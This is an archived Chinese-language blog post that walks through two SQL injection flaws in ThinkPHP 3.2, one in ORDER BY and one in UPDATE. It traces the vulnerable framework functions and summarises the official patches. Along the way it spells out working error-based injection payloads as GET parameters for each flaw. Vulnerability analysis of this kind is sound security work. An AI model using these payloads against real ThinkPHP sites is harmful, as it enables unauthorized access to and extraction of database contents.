<!DOCTYPE html>
<html>
  <!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  
  <title>TP3 order/update SQLI分析 - x1a0t&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
  
  <meta name="keywords" content=PHP,SQLI>
  
  
    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.02">
  
  
    <link rel="alternate" href="/atom.xml " title="x1a0t&#39;s Blog" type="application/atom+xml">
  

  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 7.2.0"></head>
  <body>
    <div class="container">
      <header class="header">
  <div class="blog-title">
    <a href="/" class="logo">x1a0t&#39;s Blog</a>
    <div class="subtitle"></div>
  </div>
  <nav class="navbar">
    <ul class="menu">
      
        <li class="menu-item">
          <a href="/" class="menu-item-link">Home</a>
        </li>
      
        <li class="menu-item">
          <a href="/links" class="menu-item-link">Links</a>
        </li>
      
        <li class="menu-item">
          <a href="/notes" class="menu-item-link">Notes</a>
        </li>
      
        <li class="menu-item">
          <a href="/about" class="menu-item-link">About</a>
        </li>
      
    </ul>
  </nav>
</header>
<article class="post">
  <div class="post-title">
    <h1 class="article-title">TP3 order/update SQLI分析</h1>
  </div>
   <div class="post-meta">
    <span class="post-time">2018-09-27</span>
    
      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/SQLI/" rel="tag">SQLI</a></li></ul>
    
  </div>
  <div class="post-content">
    <p>Thinkphp作为php的经典框架之一，其安全行还是基本可靠的。这里分析一下Thinkphp3.2中的几个网上披露出来的漏洞</p>
<h1 id="orderby注入"><a href="#orderby注入" class="headerlink" title="orderby注入"></a>orderby注入</h1><p>切换到补丁前：git checkout 9e1db19<br>测试代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$order</span> = <span class="title function_ invoke__">I</span>(<span class="string">&#x27;get.order&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">M</span>(<span class="string">&#x27;users&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&#x27;1=1&#x27;</span>)-&gt;<span class="title function_ invoke__">order</span>(<span class="variable">$order</span>)-&gt;<span class="title function_ invoke__">select</span>();    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload为：<code>?order[updatexml(0,concat(0x7e,user()),1)]=1</code></p>
<p>造成漏洞的原因在<code>parseOrder</code>函数中&#x2F;ThinkPHP&#x2F;Library&#x2F;Think&#x2F;Db&#x2F;Driver.class.php:754</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseOrder</span>(<span class="params"><span class="variable">$order</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$order</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$array</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$order</span>)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$order</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="literal">false</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$val</span>, <span class="string">&#x27;(&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="variable">$array</span>[] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$val</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$sort</span>    = <span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$val</span>), <span class="keyword">array</span>(<span class="string">&#x27;asc&#x27;</span>, <span class="string">&#x27;desc&#x27;</span>)) ? <span class="string">&#x27; &#x27;</span> . <span class="variable">$val</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                <span class="variable">$array</span>[] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$key</span>) . <span class="variable">$sort</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="string">&#x27;[RAND]&#x27;</span> == <span class="variable">$order</span>) &#123;</span><br><span class="line">        <span class="comment">// 随机排序</span></span><br><span class="line">        <span class="variable">$array</span>[] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseRand</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$order</span>) <span class="keyword">as</span> <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\s+(ASC|DESC)$/i&#x27;</span>, <span class="title function_ invoke__">rtrim</span>(<span class="variable">$val</span>), <span class="variable">$match</span>, PREG_OFFSET_CAPTURE)) &#123;</span><br><span class="line">                <span class="variable">$array</span>[] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="title function_ invoke__">ltrim</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$val</span>, <span class="number">0</span>, <span class="variable">$match</span>[<span class="number">0</span>][<span class="number">1</span>]))) . <span class="string">&#x27; &#x27;</span> . <span class="variable">$match</span>[<span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="literal">false</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$val</span>, <span class="string">&#x27;(&#x27;</span>)) &#123;</span><br><span class="line">                <span class="variable">$array</span>[] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$val</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$order</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$array</span>);</span><br><span class="line">    <span class="keyword">return</span> !<span class="keyword">empty</span>(<span class="variable">$order</span>) ? <span class="string">&#x27; ORDER BY &#x27;</span> . <span class="variable">$order</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们传入的是数组形式，则进入的是下面的代码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$order</span>)) &#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$order</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$val</span>, <span class="string">&#x27;(&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$array</span>[] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$val</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$sort</span>    = <span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$val</span>), <span class="keyword">array</span>(<span class="string">&#x27;asc&#x27;</span>, <span class="string">&#x27;desc&#x27;</span>)) ? <span class="string">&#x27; &#x27;</span> . <span class="variable">$val</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$array</span>[] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$key</span>) . <span class="variable">$sort</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果传入的数组<code>$key</code>不是数字，则通过<code>$this-&gt;parseKey($key)</code>后，拼接进<code>$array</code>，跟进看一下&#x2F;ThinkPHP&#x2F;Library&#x2F;Think&#x2F;Db&#x2F;Driver&#x2F;Mysql.class.php:101</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseKey</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[,\&#x27;\&quot;\*\(\)`.\s]/&#x27;</span>, <span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="variable">$key</span> = <span class="string">&#x27;`&#x27;</span> . <span class="variable">$key</span> . <span class="string">&#x27;`&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$key</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的正则形同虚设，也就是说我们的恶意数据压根没处理，导致了SQL注入</p>
<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><img src="/2018/09/27/Thinkphp3-2-Orderby-SQLi-Update-SQLi/2.png"><br>给parseKey加了一个参数控制判断，调用时使用<code>parseKey($key,true)</code>即可</p>
<h1 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h1><p><code>git checkout 977806d</code><br>测试代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$data</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="title function_ invoke__">I</span>(<span class="string">&#x27;get.name&#x27;</span>);</span><br><span class="line">        <span class="variable">$data</span>[<span class="string">&#x27;passwd&#x27;</span>] = <span class="title function_ invoke__">I</span>(<span class="string">&#x27;get.passwd&#x27;</span>);</span><br><span class="line">        <span class="variable">$map</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="title function_ invoke__">I</span>(<span class="string">&#x27;get.id&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">M</span>(<span class="string">&#x27;users&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="variable">$map</span>)-&gt;<span class="title function_ invoke__">save</span>(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>模仿已有的payload的写一个:<code>index.php?passwd[]=123&amp;name=xiaot&amp;id[0]=bind&amp;id[1]=0+and+(updatexml(1,concat(0x7e,(select+user()),0x7e),1))</code><br><img src="/2018/09/27/Thinkphp3-2-Orderby-SQLi-Update-SQLi/1.png"><br>看到报错，但是并没有注出信息来，通过断点调试一波，追到&#x2F;ThinkPHP&#x2F;Library&#x2F;Think&#x2F;Db&#x2F;Driver.class.php:416</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseSet</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$val</span>[<span class="number">0</span>]) &amp;&amp; <span class="string">&#x27;exp&#x27;</span> == <span class="variable">$val</span>[<span class="number">0</span>]) &#123;</span><br><span class="line">            <span class="variable">$set</span>[] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$key</span>) . <span class="string">&#x27;=&#x27;</span> . <span class="variable">$val</span>[<span class="number">1</span>];</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">            <span class="variable">$set</span>[] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$key</span>) . <span class="string">&#x27;=NULL&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_scalar</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">            <span class="comment">// 过滤非标量数据</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$val</span>, <span class="string">&#x27;:&#x27;</span>) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$val</span>, <span class="title function_ invoke__">array_keys</span>(<span class="variable">$this</span>-&gt;bind))) &#123;</span><br><span class="line">                <span class="variable">$set</span>[] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$key</span>) . <span class="string">&#x27;=&#x27;</span> . <span class="variable">$val</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$name</span>  = <span class="title function_ invoke__">count</span>(<span class="variable">$this</span>-&gt;bind);</span><br><span class="line">                <span class="variable">$set</span>[] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$key</span>) . <span class="string">&#x27;=:&#x27;</span> . <span class="variable">$key</span> . <span class="string">&#x27;_&#x27;</span> . <span class="variable">$name</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="variable">$key</span> . <span class="string">&#x27;_&#x27;</span> . <span class="variable">$name</span>, <span class="variable">$val</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27; SET &#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$set</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>经过该函数处理后，我们的$data数据进入set操作，形成参数绑定的形式，只不过和网上的有点不一样<br><img src="/2018/09/27/Thinkphp3-2-Orderby-SQLi-Update-SQLi/3.png"><br>先不管，继续追到&#x2F;ThinkPHP&#x2F;Library&#x2F;Think&#x2F;Db&#x2F;Driver.class.php:606下的parseWhereItem函数，其中对bind表达式有处理：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#125; <span class="keyword">elseif</span> (<span class="string">&#x27;bind&#x27;</span> == <span class="variable">$exp</span>) &#123;</span><br><span class="line">    <span class="comment">// 使用表达式</span></span><br><span class="line">    <span class="variable">$whereStr</span> .= <span class="variable">$key</span> . <span class="string">&#x27; = :&#x27;</span> . <span class="variable">$val</span>[<span class="number">1</span>];</span><br></pre></td></tr></table></figure>

<p>这里的拼接操作形成如下形式：<br><img src="/2018/09/27/Thinkphp3-2-Orderby-SQLi-Update-SQLi/4.png"><br>也就是说在执行后面绑定的时候，这里的:0并没有参数去替换，所以我们需要更改一下<code>id[1]=name_0+and+(updatexml(1,concat(0x7e,(select+user()),0x7e),1))</code>，于是就可以继续注入了，所以要利用还需要根据实际情况来???<br><img src="/2018/09/27/Thinkphp3-2-Orderby-SQLi-Update-SQLi/5.png"></p>
<h1 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h1><p>官方直接在think_filter中添加了对bind过滤</p>

  </div>
  <div class="post-footer">
    <a href="#top" class="top">Post.Top</a>
  </div>
</article>
<footer>
  &copy; 2024
  <span class="author">
    x1a0t
  </span>
</footer>
    </div>
  </body>
</html>